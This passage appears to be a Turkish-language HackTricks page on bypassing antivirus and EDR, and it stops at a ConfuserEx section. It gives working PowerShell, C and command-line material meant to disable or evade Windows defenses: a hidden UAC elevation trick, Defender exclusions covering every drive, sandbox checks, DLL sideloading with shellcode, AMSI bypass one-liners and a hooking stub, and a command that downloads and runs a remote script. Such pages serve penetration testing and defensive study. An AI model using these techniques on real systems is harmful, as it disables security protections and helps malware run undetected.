# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Bu sayfa ilk olarak** [**@m2rc_p**](https://twitter.com/m2rc_p)** tarafından yazılmıştır!**

## Defender'ı Durdurma

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender'ın çalışmasını durdurmaya yönelik bir araç.
- [no-defender](https://github.com/es3n1n/no-defender): Başka bir AV'yi taklit ederek Windows Defender'ın çalışmasını durdurmaya yönelik bir araç.
- [Yöneticiyseniz Defender'ı devre dışı bırakın](basic-powershell-for-pentesters/README.md)

### Defender'a müdahale etmeden önce kurulum programı tarzı UAC tuzağı

Oyun hilesi gibi görünen herkese açık loader'lar genellikle imzasız Node.js/Nexe kurulum programları olarak dağıtılır; bu programlar önce **kullanıcıdan yükseltme izni ister**, ardından Defender'ı etkisiz hâle getirir. Akış basittir:

1. `net session` ile yönetici bağlamında çalışılıp çalışılmadığını kontrol edin. Komut yalnızca çağıran tarafın yönetici haklarına sahip olması durumunda başarılı olur; dolayısıyla başarısız olması, loader'ın standart kullanıcı olarak çalıştığını gösterir.
2. Özgün komut satırını korurken beklenen UAC onay istemini tetiklemek için kendisini hemen `RunAs` fiiliyle yeniden başlatın.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Kurbanlar zaten “crack’li” yazılım yüklediklerini düşündüğünden istemi genellikle kabul eder ve böylece malware, Defender’ın ilkesini değiştirmek için ihtiyaç duyduğu hakları elde eder.<sup>[[26]](#references)</sup>

### Her sürücü harfi için genel `MpPreference` istisnaları

Yetki yükseltildikten sonra GachiLoader tarzı zincirler, hizmeti tamamen devre dışı bırakmak yerine Defender’ın göremediği alanları en üst düzeye çıkarır. Loader önce GUI watchdog’unu sonlandırır (`taskkill /F /IM SecHealthUI.exe`), ardından her kullanıcı profilinin, sistem dizininin ve çıkarılabilir diskin taranamaz hâle gelmesi için **son derece geniş istisnalar** ekler:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Önemli gözlemler:

- Döngü, bağlanmış her dosya sistemini (D:\, E:\, USB bellekler vb.) tarar; bu nedenle **diske herhangi bir yere bırakılan gelecekteki payload'lar göz ardı edilir**.
- `.sys` uzantısına yönelik hariç tutma ileriye dönüktür: saldırganlar, daha sonra Defender'a tekrar dokunmadan imzasız driver'lar yükleme seçeneğini saklı tutar.
- Tüm değişiklikler `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` altında yapılır. Böylece sonraki aşamalar, bu hariç tutmaların kalıcı olduğunu doğrulayabilir veya UAC'yi yeniden tetiklemeden kapsamlarını genişletebilir.

Hiçbir Defender service durdurulmadığı için basit durum denetimleri, gerçek zamanlı inceleme bu yolları hiç denetlemese de “antivirus active” bildirmeye devam eder.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Günümüzde AV'ler bir dosyanın kötü amaçlı olup olmadığını kontrol etmek için farklı yöntemler kullanıyor: statik tespit, dinamik analiz ve daha gelişmiş EDR'ler için davranış analizi.

### **Statik tespit**

Statik tespit; bir binary veya script içindeki bilinen kötü amaçlı dizeleri ya da byte dizilerini işaretleyerek ve dosyanın kendisinden bilgi çıkararak (ör. dosya açıklaması, şirket adı, dijital imzalar, simge, checksum vb.) gerçekleştirilir. Bu nedenle bilinen public araçları kullanmak yakalanma olasılığınızı artırabilir; çünkü bu araçlar muhtemelen analiz edilip kötü amaçlı olarak işaretlenmiştir. Bu tür bir tespitten kaçınmanın birkaç yolu vardır:

- **Encryption**

Binary'yi şifrelerseniz AV'nin programınızı tespit etmesi mümkün olmaz; ancak programın şifresini çözüp bellekte çalıştıracak bir loader'a ihtiyacınız olur.

- **Obfuscation**

Bazen binary veya script'inizdeki bazı dizeleri değiştirmeniz AV'yi atlatmanız için yeterlidir; ancak gizlemeye çalıştığınız şeye bağlı olarak bu işlem zaman alabilir.

- **Custom tooling**

Kendi araçlarınızı geliştirirseniz bilinen kötü amaçlı imzalarla karşılaşmazsınız; ancak bu çok fazla zaman ve çaba gerektirir.

> [!TIP]
> Windows Defender'ın statik tespitine karşı kontrol yapmak için [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) kullanabilirsiniz. Araç dosyayı birden fazla segmente böler ve ardından Defender'dan her birini ayrı ayrı taramasını ister. Böylece binary'nizde hangi dizelerin veya byte'ların işaretlendiğini tam olarak görebilirsiniz.

Uygulamalı AV Evasion hakkındaki bu [YouTube playlist'ine](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) göz atmanızı şiddetle öneririm.

### **Dinamik analiz**

Dinamik analiz, AV'nin binary'nizi bir sandbox'ta çalıştırıp kötü amaçlı etkinlikleri izlemesidir (ör. tarayıcınızın parolalarının şifresini çözmeye ve okumaya çalışmak, LSASS üzerinde minidump almak vb.). Bu yöntemle başa çıkmak biraz daha zor olabilir; ancak sandbox'lardan kaçınmak için yapabilecekleriniz şunlardır.

- **Çalıştırmadan önce bekleme** Uygulanma biçimine bağlı olarak bu, AV'nin dinamik analizini atlatmanın harika bir yolu olabilir. AV'lerin, kullanıcının iş akışını kesintiye uğratmamak için dosyaları taramak üzere ayırdığı süre çok kısadır; bu nedenle uzun süre beklemek, binary analizini aksatabilir. Sorun şu ki birçok AV sandbox'ı, uygulama biçimine bağlı olarak beklemeyi atlayabilir.
- **Makinenin kaynaklarını kontrol etme** Sandbox'lar genellikle çok az kaynağa sahiptir (ör. < 2GB RAM); aksi hâlde kullanıcının makinesini yavaşlatabilirler. Burada oldukça yaratıcı olabilirsiniz; örneğin CPU sıcaklığını, hatta fan hızlarını kontrol edebilirsiniz. Sandbox'ta her şey uygulanmış olmayabilir.
- **Makineye özgü kontroller** "contoso.local" domain'ine katılmış bir iş istasyonuna sahip kullanıcıyı hedeflemek istiyorsanız, bilgisayarın domain'ini kontrol edip belirttiğinizle eşleşip eşleşmediğine bakabilirsiniz. Eşleşmiyorsa programınızdan çıkabilirsiniz.

Microsoft Defender'ın Sandbox bilgisayar adının HAL9TH olduğu ortaya çıktı. Bu nedenle malware'inizde çalıştırılmadan önce bilgisayar adını kontrol edebilirsiniz. Ad HAL9TH ile eşleşiyorsa Defender'ın sandbox'ındasınız demektir; bu durumda programınızdan çıkabilirsiniz.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>kaynak: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

[@mgeeky](https://twitter.com/mariuszbit) tarafından sandbox'lara karşı kullanılabilecek diğer yararlı ipuçları:

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanalı</p></figcaption></figure>

Bu gönderide daha önce de belirttiğimiz gibi, **public araçlar** eninde sonunda **tespit edilir**. Bu yüzden kendinize şunu sormalısınız:

Örneğin, LSASS dökümü almak istiyorsanız, **gerçekten mimikatz kullanmanız gerekiyor mu**? Yoksa daha az bilinen ve LSASS dökümü alan başka bir proje kullanabilir misiniz?

Muhtemelen doğru yanıt ikincisidir. Mimikatz'ı örnek alırsak, AV'ler ve EDR'ler tarafından en çok işaretlenen malware'lerden biri, hatta belki de en çok işaretlenenidir. Projenin kendisi çok etkileyici olsa da AV'leri atlatmak için onunla uğraşmak bir kâbustur; bu nedenle yapmak istediğiniz şey için alternatifler arayın.

> [!TIP]
> Payload'larınızı evasion için değiştirirken Defender'da **automatic sample submission'ı kapatın** ve lütfen, uzun vadede evasion elde etmek istiyorsanız, **VIRUSTOTAL'A YÜKLEMEYİN**. Payload'ınızın belirli bir AV tarafından tespit edilip edilmediğini kontrol etmek istiyorsanız bir VM'ye yükleyin, automatic sample submission'ı kapatmayı deneyin ve sonuçtan memnun kalana kadar orada test edin.

## EXEs vs DLLs

Mümkün olduğunda evasion için her zaman **DLL kullanmaya öncelik verin**. Deneyimlerime göre DLL dosyaları genellikle **çok daha az tespit edilir** ve analiz edilir; bu nedenle bazı durumlarda tespitten kaçınmak için bu oldukça basit bir yöntemdir (elbette payload'ınızın DLL olarak çalışmasını sağlayacak bir yolu varsa).

Bu görselde görebileceğimiz gibi, Havoc'un DLL Payload'ı antiscan.me'de 4/26 tespit oranına sahipken EXE payload'ının tespit oranı 7/26'dır.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me'de normal bir Havoc EXE payload'ı ile normal bir Havoc DLL'in karşılaştırması</p></figcaption></figure>

Şimdi DLL dosyalarıyla daha gizli çalışmanızı sağlayacak bazı yöntemleri göstereceğiz.

## DLL Sideloading & Proxying

**DLL Sideloading**, victim uygulamasını ve kötü amaçlı payload'ları yan yana yerleştirerek loader'ın kullandığı DLL arama sırasından yararlanır.

[Siofra](https://github.com/Cybereason/siofra) ve aşağıdaki powershell script'iyle DLL Sideloading'e açık programları bulabilirsiniz:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Bu komut, "C:\Program Files\\" içindeki DLL hijacking’e açık programların ve yüklemeye çalıştıkları DLL dosyalarının listesini verir.

**DLL Hijackable/Sideloadable programları kendiniz keşfetmenizi** şiddetle tavsiye ederim. Bu teknik doğru uygulandığında oldukça gizlidir; ancak herkese açık şekilde bilinen DLL Sideloadable programları kullanırsanız kolayca yakalanabilirsiniz.

Bir programın yüklemeyi beklediği adda kötü amaçlı bir DLL yerleştirmek, payload’unuzu yüklemez; çünkü program, bu DLL’in içinde belirli işlevlerin bulunmasını bekler. Bu sorunu çözmek için **DLL Proxying/Forwarding** adlı başka bir teknik kullanacağız.

**DLL Proxying**, programın yaptığı çağrıları proxy (ve kötü amaçlı) DLL’den orijinal DLL’e iletir. Böylece programın işlevselliği korunurken payload’unuzun yürütülmesi de sağlanır.

[@flangvik](https://twitter.com/Flangvik/) tarafından geliştirilen [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projesini kullanacağım.

İzlediğim adımlar şunlardı:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Son komut bize 2 dosya verecek: bir DLL kaynak kodu şablonu ve yeniden adlandırılmış orijinal DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Bunlar sonuçlar:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Hem shellcode'umuz ([SGN](https://github.com/EgeBalci/sgn) ile encode edilmiş) hem de proxy DLL, [antiscan.me](https://antiscan.me) üzerinde 0/26 Detection rate değerine sahip! Bunu başarılı sayarım.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading hakkında [S3cur3Th1sSh1t'ın twitch VOD'unu](https://www.twitch.tv/videos/1644171543) ve daha önce konuştuklarımızı daha derinlemesine öğrenmek için [ippsec'in videosunu](https://www.youtube.com/watch?v=3eROsG_WNpE) izlemenizi **şiddetle tavsiye ederim**.

### Forwarded Exports'u Kötüye Kullanma (ForwardSideLoading)

Windows PE modülleri, aslında “forwarder” olan işlevleri dışa aktarabilir: export girdisi, kodu işaret etmek yerine `TargetDll.TargetFunc` biçiminde bir ASCII dizgesi içerir. Bir çağıran export'u çözümlerken Windows loader şunları yapar:

- `TargetDll` yüklü değilse yükler
- `TargetFunc` işlevini buradan çözümler

Anlaşılması gereken temel davranışlar:
- `TargetDll` bir KnownDLL ise, korumalı KnownDLLs namespace'inden sağlanır (ör. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- `TargetDll` bir KnownDLL değilse, normal DLL search order kullanılır. Buna forward çözümlemesini yapan modülün dizini de dahildir.

Bu, dolaylı bir sideloading primitive'ini mümkün kılar: işlevi KnownDLL olmayan bir modül adına forward edilmiş bir signed DLL bulun, ardından bu signed DLL'yi forward edilen hedef modülle tam olarak aynı ada sahip, saldırganın kontrolündeki bir DLL ile aynı dizine yerleştirin. Forward edilen export çağrıldığında loader forward'ı çözümler ve aynı dizindeki DLL'nizi yükleyerek DllMain'inizi çalıştırır.<sup>[[13]](#references)</sup>

Windows 11'de gözlemlenen örnek:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` bir KnownDLL olmadığından normal arama sırası üzerinden çözümlenir.

PoC (copy-paste):
1) İmzalı sistem DLL'sini yazılabilir bir klasöre kopyalayın.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Aynı klasöre kötü amaçlı bir NCRYPTPROV.dll bırakın. Minimal bir DllMain, code execution elde etmek için yeterlidir; DllMain'i tetiklemek için yönlendirilen işlevi uygulamanız gerekmez.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) İmzalı bir LOLBin ile forward'ı tetikleyin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Gözlemlenen davranış:
- rundll32 (imzalı), side-by-side `keyiso.dll` dosyasını (imzalı) yükler
- `KeyIsoSetAuditingInterface` çözülürken yükleyici, `NCRYPTPROV.SetAuditingInterface` yönlendirmesini izler
- Yükleyici daha sonra `C:\test` konumundaki `NCRYPTPROV.dll` dosyasını yükler ve `DllMain` işlevini çalıştırır
- `SetAuditingInterface` uygulanmamışsa, `DllMain` zaten çalıştıktan sonra "eksik API" hatası alırsınız

Araştırma ipuçları:
- Hedef modülün KnownDLL olmadığı yönlendirilmiş export'lara odaklanın. KnownDLL'ler `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` altında listelenir.
- Yönlendirilmiş export'ları şu araçları kullanarak sıralayabilirsiniz:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Adayları aramak için Windows 11 forwarder envanterine bakın: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Tespit/savunma önerileri:
- LOLBins'in (ör. rundll32.exe) sistem dışı yollardan imzalı DLL'ler yüklemesini ve ardından aynı dizinden aynı temel ada sahip KnownDLLs olmayan DLL'leri yüklemesini izleyin
- Şu tür işlem/modül zincirleri için uyarı oluşturun: kullanıcı tarafından yazılabilir yollar altında `rundll32.exe` → sistem dışı `keyiso.dll` → `NCRYPTPROV.dll`
- Kod bütünlüğü ilkelerini (WDAC/AppLocker) zorunlu kılın ve uygulama dizinlerinde yazma+çalıştırma iznini reddedin

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze, askıya alınmış süreçler, doğrudan syscalls ve alternatif yürütme yöntemleri kullanarak EDR'leri atlatmaya yönelik bir payload araç setidir`

Shellcode'unuzu gizli bir şekilde yüklemek ve çalıştırmak için Freeze'i kullanabilirsiniz.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion bir kedi-fare oyunudur; bugün işe yarayan bir yöntem yarın tespit edilebilir. Bu yüzden asla tek bir araca güvenmeyin; mümkünse birden fazla evasion tekniğini zincirleme kullanın.

## Direct/Indirect Syscalls ve SSN Çözümleme (SysWhispers4)

EDR'ler, `ntdll.dll` syscall stub'larına sıklıkla **user-mode inline hook** yerleştirir. Bu hook'ları atlatmak için doğru **SSN**'yi (System Service Number) yükleyen ve hook'lanmış export entrypoint'ini çalıştırmadan kernel mode'a geçiş yapan **direct** veya **indirect** syscall stub'ları oluşturabilirsiniz.<sup>[[32]](#references)</sup>

**Çağrı seçenekleri:**
- **Direct (embedded)**: Oluşturulan stub'a `syscall`/`sysenter`/`SVC #0` talimatı ekler (`ntdll` export'una uğramaz).
- **Indirect**: Kernel geçişinin `ntdll` kaynaklı görünmesi için `ntdll` içindeki mevcut bir `syscall` gadget'ına atlar (heuristic evasion için kullanışlıdır); **randomized indirect**, her çağrıda bir havuzdan gadget seçer.
- **Egg-hunt**: Statik `0F 05` opcode dizisinin diske eklenmesini önler; syscall dizisini çalışma zamanında çözümler.

**Hook'a dayanıklı SSN çözümleme stratejileri:**
- **FreshyCalls (VA sort)**: Stub baytlarını okumak yerine syscall stub'larını sanal adreslerine göre sıralayarak SSN'leri çıkarır.
- **SyscallsFromDisk**: Temiz bir `\KnownDlls\ntdll.dll` eşler, `.text` bölümünden SSN'leri okur ve ardından eşlemeyi kaldırır (bellek içindeki tüm hook'ları atlatır).
- **RecycledGate**: VA sıralamasına dayalı SSN çıkarımını, stub temiz olduğunda opcode doğrulamasıyla birleştirir; hook varsa VA çıkarımına geri döner.
- **HW Breakpoint**: `syscall` talimatında DR0'ı ayarlar ve hook'lanmış baytları ayrıştırmadan çalışma zamanında `EAX` içindeki SSN'yi yakalamak için bir VEH kullanır.

SysWhispers4 kullanım örneği:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI, “[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)” tehdidini önlemek için oluşturuldu. Başlangıçta AV’ler yalnızca **diskteki dosyaları** tarayabiliyordu; dolayısıyla payload’ları bir şekilde **doğrudan bellekte** çalıştırabilirseniz, yeterli görünürlüğe sahip olmadıkları için AV’ler bunu önlemek adına hiçbir şey yapamıyordu.

AMSI özelliği Windows’un şu bileşenlerine entegre edilmiştir:

- Kullanıcı Hesabı Denetimi veya UAC (EXE, COM, MSI ya da ActiveX kurulumunun yükseltilmesi)
- PowerShell (script’ler, etkileşimli kullanım ve dinamik kod değerlendirmesi)
- Windows Script Host (wscript.exe ve cscript.exe)
- JavaScript ve VBScript
- Office VBA makroları

Antivirüs çözümlerinin script davranışlarını, script içeriğini hem şifrelenmemiş hem de gizlenmemiş biçimde sunarak incelemesine olanak tanır.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` komutunu çalıştırmak, Windows Defender’da aşağıdaki uyarıyı oluşturur.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Başına `amsi:` ve ardından script’in çalıştığı yürütülebilir dosyanın yolunu eklediğine dikkat edin; bu örnekte bu dosya powershell.exe’dir.

Diske hiçbir dosya bırakmadık, ancak AMSI nedeniyle yine de bellekte yakalandık.

Ayrıca, **.NET 4.8** sürümünden itibaren C# kodu da AMSI üzerinden çalıştırılır. Bu, bellekte çalıştırmak için kullanılan `Assembly.Load(byte[])` yöntemini de etkiler. AMSI’den kaçınmak amacıyla bellekte çalıştırma yaparken daha düşük .NET sürümlerinin (ör. 4.7.2 veya daha altı) önerilmesinin nedeni budur.

AMSI’yi aşmanın birkaç yolu vardır:

- **Obfuscation**

AMSI çoğunlukla statik tespit yöntemleri kullandığından, yüklemeye çalıştığınız script’leri değiştirmek tespitten kaçınmanın iyi bir yolu olabilir.

Ancak AMSI, birden fazla katmanı olsa bile script’lerin obfuscation’ını çözebilir; bu nedenle obfuscation, nasıl yapıldığına bağlı olarak kötü bir seçenek olabilir. Bu da tespitten kaçınmayı pek kolay olmayan bir hâle getirir. Yine de bazen birkaç değişken adını değiştirmeniz yeterli olur; bu, bir şeyin ne ölçüde işaretlendiğine bağlıdır.

- **AMSI Bypass**

AMSI, powershell (ayrıca cscript.exe, wscript.exe vb.) sürecine bir DLL yüklenerek uygulandığı için, ayrıcalıksız bir kullanıcı olarak çalışırken bile bu DLL’ye kolayca müdahale etmek mümkündür. AMSI uygulamasındaki bu kusur nedeniyle araştırmacılar, AMSI taramasından kaçınmanın birden fazla yolunu bulmuştur.

**Bir Hatayı Zorlamak**

AMSI başlatmasının başarısız olmasını zorlamak (`amsiInitFailed`), geçerli süreç için hiçbir tarama başlatılmamasına neden olur. Bu yöntem ilk olarak [Matt Graeber](https://twitter.com/mattifestation) tarafından açıklandı ve Microsoft, yaygın kullanımını önlemek için bir imza geliştirdi.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

AMSI'yi mevcut PowerShell süreci için kullanılamaz hâle getirmek tek satırlık bir PowerShell kodu gerektirdi. Elbette bu satır AMSI tarafından işaretlendi; bu tekniği kullanabilmek için bazı değişiklikler yapmak gerekiyor.

İşte bu [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) içinden aldığım değiştirilmiş bir AMSI bypass.

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Unutmayın, bu gönderi yayımlandıktan sonra muhtemelen tespit edilecek; bu nedenle amacınız fark edilmeden kalmaksa herhangi bir kod yayımlamamalısınız.

**Memory Patching**

Bu teknik ilk olarak [@RastaMouse](https://twitter.com/_RastaMouse/) tarafından keşfedildi. Tekniğin amacı, amsi.dll içindeki "AmsiScanBuffer" işlevinin (kullanıcının sağladığı girdiyi taramaktan sorumludur) adresini bulup bu işlevin E_INVALIDARG kodunu döndürmesini sağlayan talimatlarla üzerine yazmaktır. Böylece gerçek taramanın sonucu 0 döner ve bu sonuç temiz olarak yorumlanır.

> [!TIP]
> Daha ayrıntılı bir açıklama için lütfen [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) sayfasını okuyun.

AMSI'yi powershell ile atlatmak için kullanılan başka birçok teknik de var. Bunlar hakkında daha fazla bilgi edinmek için [**bu sayfaya**](basic-powershell-for-pentesters/index.html#amsi-bypass) ve [**bu repoya**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) göz atın.

### amsi.dll yüklenmesini engelleyerek AMSI'yi devre dışı bırakma (LdrLoadDll hook)

AMSI, yalnızca `amsi.dll` geçerli sürece yüklendikten sonra başlatılır. Sağlam ve dilden bağımsız bir bypass yöntemi, `ntdll!LdrLoadDll` üzerinde bir user-mode hook kullanarak istenen modül `amsi.dll` olduğunda hata döndürmektir. Sonuç olarak, AMSI hiç yüklenmez ve bu süreç için hiçbir tarama yapılmaz.<sup>[[23]](#references)</sup>

Uygulamaya genel bakış (x64 C/C++ sözde kodu):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notlar
- PowerShell, WScript/CScript ve özel loader'lar arasında çalışır (aksi hâlde AMSI'yi yükleyecek her şey).
- Uzun komut satırı izlerinden kaçınmak için script'leri stdin üzerinden göndermekle birlikte kullanın (`PowerShell.exe -NoProfile -NonInteractive -Command -`).
- LOLBin'ler aracılığıyla çalıştırılan loader'larla kullanıldığı görülmüştür (ör. `DllRegisterServer` çağıran `regsvr32`).

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** aracı da AMSI'yi bypass etmek için script üretir.
**[https://amsibypass.com/](https://amsibypass.com/)** aracı da rastgeleleştirilmiş kullanıcı tanımlı işlevler, değişkenler ve karakter ifadeleri kullanarak imzadan kaçınan ve imzadan kaçınmak için PowerShell anahtar sözcüklerinin büyük/küçük harf kullanımını rastgele değiştiren, AMSI'yi bypass etmeye yönelik script üretir.

**Algılanan imzayı kaldırma**

Geçerli işlemin belleğindeki algılanan AMSI imzasını kaldırmak için **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** ve **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gibi araçlar kullanabilirsiniz. Bu araç, AMSI imzası için geçerli işlemin belleğini tarar ve ardından imzayı NOP talimatlarıyla üzerine yazarak bellekten etkili biçimde kaldırır.

**AMSI kullanan AV/EDR ürünleri**

AMSI kullanan AV/EDR ürünlerinin listesini **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** adresinde bulabilirsiniz.

**PowerShell sürüm 2'yi kullanma**
PowerShell sürüm 2'yi kullanırsanız AMSI yüklenmez; böylece script'lerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz:

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell logging, bir sistemde yürütülen tüm PowerShell komutlarını kaydetmenizi sağlayan bir özelliktir. Denetim ve sorun giderme amacıyla kullanışlı olabilir, ancak **tespit edilmekten kaçınmak isteyen saldırganlar için sorun oluşturabilir**.

PowerShell logging'i atlatmak için aşağıdaki teknikleri kullanabilirsiniz:

- **PowerShell Transcription ve Module Logging'i devre dışı bırakın**: Bu amaçla [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) gibi bir araç kullanabilirsiniz.
- **PowerShell version 2 kullanın**: PowerShell version 2 kullanırsanız AMSI yüklenmez, böylece script'lerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Şöyle yapabilirsiniz: `powershell.exe -version 2`
- **Unmanaged PowerShell session kullanın**: `powershell.exe`'yi başlatmadan PowerShell'i barındırmak için [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kullanın (Cobalt Strike'ın `powerpick` tarafından kullanılan yaklaşım). Bu yöntem, özellikle `powershell.exe` sürecine bağlı kontrolleri atlatır; ancak AMSI'yi, Script Block Logging'i veya diğer tüm PowerShell savunmalarını kendiliğinden devre dışı bırakmaz. Kapsam, runtime'a ve host implementasyonuna bağlıdır.


## Obfuscation

> [!TIP]
> Birkaç obfuscation tekniği verileri şifrelemeye dayanır; bu, binary'nin entropy'sini artırır ve AV'lerin ve EDR'lerin onu tespit etmesini kolaylaştırır. Dikkatli olun ve şifrelemeyi yalnızca kodunuzun hassas olan veya gizlenmesi gereken belirli bölümlerine uygulamayı değerlendirin.

### ConfuserEx Korumalı .NET Binary'lerinin Deobfuscation İşlemi

ConfuserEx 2 (veya ticari fork'larını) kullanan malware'leri analiz ederken, decompiler'ları ve sandbox'ları engelleyen birkaç koruma katmanıyla karşılaşmak yaygındır. Aşağıdaki iş akışı, sonrasında dnSpy veya ILSpy gibi araçlarla C#'a decompile edilebilecek, **neredeyse orijinal IL'yi güvenilir biçimde geri yükler**.<sup>[[10]](#references)</sup>

